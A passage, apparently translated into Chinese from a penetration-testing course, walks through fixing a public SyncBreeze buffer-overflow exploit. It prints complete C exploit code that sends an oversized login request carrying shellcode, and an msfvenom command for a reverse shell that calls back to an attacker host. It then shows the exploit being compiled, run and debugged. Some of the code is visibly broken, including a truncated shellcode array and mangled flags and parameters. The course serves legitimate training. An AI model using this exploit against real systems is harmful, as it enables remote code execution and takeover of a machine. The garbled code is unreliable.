

应用上述所有更改后，我们的利用代码现在看起来如下：

```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <ntypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created. \n");
    server.sin_addr.s_addr = inet_addr("10.11.0.22");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {
    char request_one[] = "POST /login HTTP/1.1\r\n"
                    "Host: 10.11.0.22\r\n"
                    "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Referer: http://10.11.0.22/login\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: ";

    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char ret[] = "\x83\x0c\x09\x10"; // 0x1009eC83

    // root@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPOR T=443 EX ITCHAIN=thread -f c -e x86/shikata_ga_nai -i "\x08\x0a\xd8\x25\x26\x2b\x3d"
    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xfb\x27\xf0\xd2\x43\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xdb"
    "\x52\x31\x78\x12\x03\x78\x12\x53\xcf\x7b\x30\xb6\x05\x05\xa7"

    char request_three[] = "&password=A";
    int content_length = 9 + strlen(padding) + strlen(ret) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(ret) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, ret);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {
    EvilRequest();
    return 0;
}
```

*列表 437 - 在更改套接字信息、返回地址指令和载荷后的利用代码*

让我们使用 **mingw-64** 编译该利用代码，看看是否会产生任何错误：

```bash
kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lw32_32
kali@kali:~/Desktop$ ls -lah
total 372K
drwxr-xr-x 2 kali kali 4.0K Feb 24 17:14 .
drwxr-xr-x 17 kali kali 4.0K Feb 24 15:42 ..
-rw-r--r-- 1 kali kali 4.7K Feb 24 15:46 42341.c
-rwxr-xr-x 1 kali kali 355K Feb 24 17:14 syncbreeze_exploit.exe
```

*列表 438 - 使用 mingw-64 编译修改后的利用代码*

既然我们有了一个更新且编译干净的利用程序，我们就可以对其进行测试了。我们将把调试器附加到我们沙盒测试目标上的 SyncBreeze 服务，并在 JMP ESP 指令的内存地址处设置一个断点：

![](img/ec25e59d75726b7041242a56d3376832_465_0.png)

*图 261：在我们的 JMP ESP 地址处设置断点*

一旦在调试器中设置了断点，我们就可以让应用程序正常运行，并尝试从 Kali Linux 执行我们的利用程序。

由于该二进制文件是交叉编译以在 Windows 上运行的，我们不能简单地直接从我们的 Kali Linux 机器上运行它。为了运行这个 Windows 二进制文件，我们将使用 wine<sup>[385]</sup>，它是一个兼容性层，能够在 Linux、BSD 和 macOS 等多种操作系统上运行 Windows 应用程序。

```bash
kali@kali:~/Desktop$ wine syncbreeze_exploit.exe

[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
```

*列表 439 - 使用 wine 运行 Windows 利用程序*

[385] (WineHQ, 2019). https://www.winehq.org/

出乎意料的是，我们根本没有触发断点。相反，应用程序崩溃了，并且 EIP 寄存器似乎被 *0x9010090c* 覆盖。

![](img/ec25e59d75726b7041242a56d3376832_466_0.png)

*图 262：EIP 被我们的返回地址指令覆盖，但地址错位了一个字节*

通过分析 EIP 中存储的值（*0x9010090c*）以及发送给目标应用程序的缓冲区，我们发现我们在堆栈上覆盖返回地址的偏移量似乎错了一个字节。错误的偏移量导致 CPU 从堆栈中 POP 了一个不同的返回地址，而不是预期的 *0x10090c83*。

### 15.1.6.1 练习

- 1. 使用 msfvenom 生成反向 shell 载荷，同时考虑我们利用程序中的坏字符。
- 2. 用新生成的载荷替换原始载荷。
- 3. 将调试器附加到目标进程，并在返回地址指令处设置断点。
- 4. 编译利用程序并运行它。你触发了断点吗？

### 15.1.7 更改溢出缓冲区

让我们试着理解我们的错位问题。查看我们由 "A" 字符组成的大填充缓冲区的第一部分是如何创建的，我们会注意到它从一个调用开始，使用 *malloc*<sup>[386]</sup>，大小为 780：

```c
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
```

*列表 440 - 使用 malloc 为初始缓冲区分配内存*

这个数字听起来应该很熟悉。如果您还记得，在 Windows 缓冲区溢出模块的研究中，我们确定 780 是覆盖堆栈上的返回地址并控制 EIP 寄存器所需的字节偏移量。

*malloc* 函数仅根据请求的大小分配一块内存。这个缓冲区需要正确初始化，这是在使用 *memset*<sup>[387]</sup> 函数在调用 *malloc* 之后完成的：

```c
memset(padding, 0x41, initial_buffer_size);
```

*列表 441 - 用 "A" 字符填充初始缓冲区*

使用 *memset* 会用特定字符填充内存分配，在我们的情况下是 0x41，即 ASCII 中 "A" 字符的十六进制表示。

利用程序中的下一行代码很有趣。有一个对 *memset* 的调用，它将分配中的最后一个字节设置为 NULL 字节：

```c
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

*列表 442 - 使用 memset 将最后一个字节设置为 null 终止符，将缓冲区转换为字符串*

这起初可能看起来令人困惑，然而，继续阅读代码，我们到达了创建最终缓冲区的几行。

```c
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, ret);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

*列表 443 - 为利用程序创建最终缓冲区*

代码首先使用 *malloc* 为缓冲区字符数组分配内存块，并用 NULL 字节填充数组。接下来，代码通过诸如 *strcpy*<sup>[388]</sup> 和 *strcat*<sup>[389]</sup> 等各种字符串操作函数复制其他变量的内容来填充缓冲区字符数组。

<sup>[386]</sup> (cplusplus, 2019), http://www.cplusplus.com/reference/cstdlib/malloc/
<sup>[387]</sup> (cplusplus, 2019), http://www.cplusplus.com/reference/cstring/memset/
<sup>[388]</sup> (cplusplus, 2019), http://www.cplusplus.com/reference/cstring/strcpy/
<sup>[389]</sup> (cplusplus, 2019), http://www.cplusplus.com/reference/cstring/strcat/

